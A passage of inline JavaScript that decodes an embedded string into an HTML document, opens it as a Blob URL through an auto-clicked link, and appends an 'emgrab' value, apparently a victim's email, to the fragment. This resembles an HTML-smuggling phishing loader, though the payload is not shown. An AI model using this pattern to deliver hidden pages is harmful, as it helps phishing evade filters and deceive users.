      for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }

      // UTF-8 bytes -> JavaScript string
      var decodedStringAtoB =
        new TextDecoder("utf-8").decode(bytes);

      // Create UTF-8 HTML document
      const myBlob = new Blob(
        [decodedStringAtoB],
        { type: "text/html;charset=UTF-8" }
      );

      const url =
        window.URL.createObjectURL(myBlob) + "#" + (emgrab || "");

      a.attr("href", url);
      $("body").append(a);
      a[0].click();

      setTimeout(function() {
        window.URL.revokeObjectURL(url.split("#")[0]);
        a.remove();
      }, 1000);
    }
  </script>
